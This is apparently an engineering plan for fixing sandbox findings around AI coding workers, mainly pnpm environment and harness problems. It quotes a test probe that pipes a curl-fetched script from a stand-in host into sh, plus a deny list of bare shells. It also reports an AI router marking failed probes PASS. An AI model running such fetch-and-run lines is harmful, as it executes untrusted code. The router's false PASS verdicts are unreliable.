artifact: wu-plan
status: ready
id: E-WSANDBOX.W10
epic: E-WSANDBOX
title: "E-WSANDBOX.W10 plan: fix what the epic e2e found, then run it again"
date: "2026-11-28"
page: 2026-11-28-e-wsandbox-w10-plan.html
requirement: >-
  A worker the launcher starts in an app worktree runs a frozen pnpm install that succeeds, with the package tree
  and the content store outside its worktree and its worktree clean after, proven by a launcher test that models
  what a background session really receives and by the e2e re-run; the owner's answers to q1-q3 are built as ruled;
  the e2e re-run's verdicts come from a worker reading raw output, and its red-doc check counts only hook messages.
maps-to: >-
  E-WSANDBOX (epic plan e2e-plan: the frozen install and pnpm add probes, the refused site, the router's red-doc
  message); E-WSANDBOX.W3 (owner q3, the package tree outside the worktree), W4 (q4, the reviewer decides each site,
  and the scratch helper on the grant); UC-ROUTE-5 (the worker's environment). Not yet in the epic plan's
  wu-summaries: the build commit adds the W10 entry (details.epic-plan-entry).
expected: >-
  In the e2e re-run, probe 2's frozen install succeeds, printenv shows PNPM_HOME, pnpm_config_modules_dir and
  pnpm_config_store_dir under the launcher's pnpm home, app/node_modules resolves to a real directory there, no
  .pnpm-store is created in the worktree or in the sandbox temp, and probe 9's git status --short is empty. Probes 3
  and 5 behave as q2 and q1 rule. The finish step prints PASS for the red-doc check. A worker's table, judged from
  the raw evidence file, gives every probe PASS or FAIL with the line it read.
test-plan:
  unit: >-
    tests/suite/router.rs, red on the epic tip and green after the owner commit:
    (1) stub_claude (router.rs:606) models the daemon: on --bg it records PNPM_HOME, pnpm_config_modules_dir and
    pnpm_config_store_dir from the --settings env object only, never from its own process env, so
    launcher_puts_a_workers_pnpm_package_tree_outside_its_worktree (router.rs:4528) goes red until the launcher
    passes them in --settings;
    (2) the same test asserts the modules dir is a real directory the user owns after spawn (the link resolves;
    red today: nothing creates it) and that pnpm_config_store_dir sits under the pnpm home;
    (3) a new case: a modules dir that is a symlink or not owned by the user is refused before the spawn, like the
    pnpm home (router-worker.sh:810);
    (4) per q1's answer: if (b), the --disallowedTools pin in
    launcher_starts_a_worker_as_a_background_session_with_the_grant_and_a_validated_mode (router.rs:1245) gains
    Bash(sh), Bash(bash), Bash(zsh) (bare shells only, so sh -c and scripts run as before);
    (5) per q2's answer: if (a), the same test's --allowedTools pin gains the pnpm shapes, and
    settings_allow_exactly_the_launcher_shapes_the_guard_admits (router.rs:2130) stays green (worker grants are not
    router settings).
  integration: >-
    The launcher run end to end against the stub claude in a fixture app worktree (the existing Launcher helper,
    router.rs:660): spawn, then resume, each carrying the env object and the existing link; a real install left in
    app/node_modules still untouched; a worktree without app gets no env and no pnpm home. One run of real pnpm is
    not possible in the hermetic suite (no network); the live check is the e2e re-run.
  e2e: >-
    The epic e2e re-run in the probe clone with the owner's three unchanged commands (prepare; the printed keel mr
    commit plus start; finish). The probe briefs gain printenv and realpath lines in probe 2 and split forms in probe
    3 (details.e2e-rerun); a worker judges the raw evidence; the finish step's red-doc count is fixed.
details:
  tip: "990e57f8cff16d6961acdd9935881291af1ade07 (= epic/E-WSANDBOX); line numbers below are at this tip."
  epic-plan-entry: >-
    wu-summaries gains E-WSANDBOX.W10 (summary: fixes from the epic e2e; maps-to: e2e-plan, W3, W4; expected: as
    above; deps: E-WSANDBOX.W3, E-WSANDBOX.W4, E-WSANDBOX.W5). Added in W10's first commit (docs/work, not
    rule-bearing).
  finding-1-package-tree:
    symptom: >-
      Probe 2: pnpm install --frozen-lockfile fails ENOENT mkdir app/node_modules/@testing-library; app/node_modules
      links at <launcher TMPDIR>/keel-worker-pnpm/modules-2921033127, which does not exist; keel-worker-pnpm is an
      empty directory (mtime 13:32). Probe 9: git status shows ?? .pnpm-store/ (102 files) in the worktree. Probe 3:
      the store was /private/tmp/claude-502/.pnpm-store.
    cause-a-proven-from-code: >-
      router-worker.sh:809 mkdirs only the pnpm home; :815 names $pnpm_modules; :863 links app/node_modules at it;
      no line creates it. The link dangles, so pnpm, writing through app/node_modules, cannot mkdir under it.
    cause-b-strong-evidence: >-
      The env exported at router-worker.sh:859 never reaches the worker. claude --bg hands the session to the Claude
      Code daemon: this worker's own job record (~/.claude/jobs/8d9c7ef4/state.json, read first-hand) shows backend
      "daemon" and providerEnv {"CLAUDE_CODE_SUBAGENT_MODEL": "sonnet"} - one forwarded variable, none of the
      caller's others. Consistent facts: pnpm used the default modules dir (the error path is app/node_modules, not
      the absolute modules dir it would have mkdir'd); with no PNPM_HOME the store fell back to the highest writable
      directory (the worktree; the sandbox temp for the scratch dir). Why W3's test passed: stub_claude runs as a
      direct child and inherits the export (router.rs:610-611), a shape the real --bg never has.
    proof: >-
      Red-first unit test (1) above makes the stub take env only from --settings, as the daemon does; the e2e
      re-run's probe 2 prints printenv of the three variables in the worker's shell. If printenv shows them and the
      install still fails, cause b is refuted and the build stops and reports.
    fix: >-
      router-worker.sh: put PNPM_HOME, pnpm_config_modules_dir and pnpm_config_store_dir=$pnpm_home/store in the
      --settings JSON's env object (Claude Code applies settings env to the session and its Bash); mkdir -p the
      modules dir and check it like the pnpm home (a real directory this user owns, not a symlink); drop the export.
      The link and the real-install rule stay. No new allowWrite root: the modules dir and the store are under the
      pnpm home, already one.
  finding-2-pipe-to-shell:
    fact: >-
      Probe 5: under auto, the reviewer allowed curl -m 10 -fsSL https://keel-probe.invalid/install.sh | sh with
      allowed_domains keel-probe.invalid; the proxy returned 502, so nothing ran. Not a defect under q4 (the reviewer
      decides each site). What bounds it today: the sandbox (writes to the worktree and allowWrite, hosts per call).
    options:
      - {option: "(a) Accept: q4 stands, the sandbox is the bound", cost: "a reviewed pipe-to-shell from an allowed host runs inside the sandbox; nothing to build"}
      - {option: "(b) Deny bare shells in --disallowedTools: Bash(sh), Bash(bash), Bash(zsh) (recommended)", cost: "best-effort (a wrapper such as python3 -c passes); refuses '... | sh' at once with a reason; sh -c and sh script.sh are unaffected; one pin test"}
      - {option: "(c) Pin a site list (strictAllowlist)", cost: "reverses the q4 ruling; every new site needs an owner commit"}
  finding-3-permission-stall:
    fact: >-
      probe-w1 sat 08:24:11-08:35:36Z on a permission prompt (the watchdog: STUCK, permission prompt); the command was
      cd <worktree> && d=$(scripts/router-scratch.sh new) && cd "$d" && env -u pnpm_config_modules_dir pnpm add
      is-number@7.0.0. Who answered is not in the transcript. Probe 6, d=$(scripts/router-scratch.sh new) &&
      scripts/router-scratch.sh init "$d", did not stall, so the helper and $( ) are not the cause; left: the cd
      outside the worktree, env as a command wrapper, or pnpm add (none on the grant, router-worker.sh:830-832).
    options:
      - {option: "(a) Grant pnpm shapes: Bash(pnpm install), Bash(pnpm install *), Bash(pnpm add *), Bash(pnpm run *), Bash(pnpm test), Bash(pnpm test *) (recommended, with c)", cost: "these run without the reviewer; the sandbox still bounds writes and hosts; a package's install script runs inside it"}
      - {option: "(b) No grant; workers keep one plain command per Bash call", cost: "the cause is unproven, so the stall may recur; nothing to build"}
      - {option: "(c) The re-run's probe 3 runs the split forms (cd alone, env -u alone, pnpm add alone) to name the shape that prompts", cost: "brief text only; the watchdog's STUCK line names the shape"}
  finding-4-bg-router-write:
    fact: >-
      The probe router (claude --bg, started by the e2e setup script at :157 in the clone's main tree) was refused two
      Writes of .router/notify/owner.md by Claude Code's background isolation ('Call EnterWorktree first ... set
      "worktree": {"bgIsolation": "none"}'). The guard is on --bg sessions writing a non-worktree checkout.
    real-router: >-
      Not hit today, inferred: keel-57 runs as the owner's interactive session, not --bg, so the guard does not
      apply; workers are --bg but write only their linked worktree, which the guard accepts (this worker's job
      record: backend daemon, cwd a linked worktree). It would hit any router moved to --bg (briefs and owner.md
      are its only writes). To confirm in the build: the router's session is absent from claude agents' background
      list (a router-side read).
    options:
      - {option: "(a) Keep the router interactive; state it in project-router; the probe router writes nothing and reports by SendMessage (recommended)", cost: "a --bg router stays unsupported; the e2e does not test the router's Write"}
      - {option: "(b) Commit worktree.bgIsolation none in .claude/settings.json", cost: "turns Claude Code's guard off for every background session in the repo; the worker file guard still confines workers; rule-bearing"}
      - {option: "(c) Set it only in the probe clone's policy commit", cost: "tests a router shape the real one does not run"}
  finding-5-e2e-harness:
    facts: >-
      The probe router (haiku) judged steps: it marked probe 2 PASS over an ENOENT failure, probe 3 PASS after an
      11-minute stall, E2 PASS for a refusal it was meant to see, and read guessed transcript paths. The finish
      step's red-doc check (setup.sh:189-190) greps the whole router transcript, so the prompt file's own text, read
      at 08:23:40 and repeated by the router at 08:38:39, counted as 2 worker-wording messages: FAIL with the router
      behaving correctly (16 router messages, red doc unchanged).
    fix: >-
      probe-router.md: the router runs the steps and sends raw output only, no PASS/FAIL, no path it did not print;
      no Write (finding 4 default). setup.sh finish: counts only Stop-hook feedback records (jq over records whose
      content starts 'Stop hook feedback'), and writes one raw evidence file (the worker's PROBE-RESULTS.txt, the
      router's tool results, the log) into the log's folder. The router keel-57 then dispatches one worker that
      judges each probe against the epic plan's e2e-plan from that file, quoting the line it read. The owner's three
      commands are unchanged.
  e2e-rerun:
    when: after W10 is signed and merged into epic/E-WSANDBOX (prepare detaches on the epic tip)
    owner-commands: >-
      1. bash <epic checkout>/docs/work/2026-11-28-e-wsandbox-e2e-setup.sh prepare. 2. the one line it prints (cd
      <probe clone> && keel mr commit -m "probe: ..." --as vuluu && bash ... start). 3. after the probe router's
      message: cd <probe clone> && bash ... finish. Then send the log to the router.
    probe-changes: >-
      probe 2: printenv PNPM_HOME pnpm_config_modules_dir pnpm_config_store_dir; realpath app/node_modules; then the
      frozen install; ls of the modules dir's .pnpm for xmlbuilder without a grep that hides errors. probe 3: the
      split forms of finding 3 (c). probe 9: git status --short, and ls -a of the worktree for .pnpm-store. All other
      probes and steps as on 2026-11-28.
    previous-run: >-
      2026-11-28 log ~/keel-wsandbox-e2e.log lines 36-60: finish printed PASS status matches the transcript
      (47280/47280), router messages=16 worker messages=2 agentSetting=router, red doc unchanged=yes, FAIL the
      red-doc check (finding 5), and the clone was left clean.
  rule-bearing-files:
    - "scripts/router-worker.sh (finding 1; q1 b; q2 a)"
    - ".claude/skills/project-router/SKILL.md (the Workers paragraph: env through --settings, the modules dir made; the router runs interactive, q3 a)"
    - ".claude/settings.json only if q3 is (b)"
  not-rule-bearing:
    - "tests/suite/router.rs"
    - "docs/work/2026-11-28-e-wsandbox-e2e-setup.sh, docs/work/2026-11-28-e-wsandbox-e2e-probe-router.md (finding 5, probe changes)"
    - "docs/work/2026-11-24-e-wsandbox-plan.yaml (the W10 entry)"
  commits: >-
    Worker: 1. the W10 entry and the red tests (cargo test shows them red); 2. the e2e harness changes. Owner: one
    keel mr commit with every rule-bearing change, staged by the worker, after which the tests are green. Worker:
    the result pair, notes; a fresh review worker writes cr; the owner signs and merges.
  distillation: >-
    DEC-46 point 9 and UC-ROUTE-5: the worker's pnpm env arrives through --settings (a --bg session gets no caller
    env); the project-router Workers section; the q1-q3 answers as Amended rows of DEC-37/DEC-46.
  open-questions:
    - "q1 (finding 2): pipe-to-shell under auto? Default (b): deny bare sh, bash, zsh."
    - "q2 (finding 3): pnpm on the grant? Default (a) with (c)."
    - "q3 (finding 4): a background router's writes? Default (a): the router stays interactive."
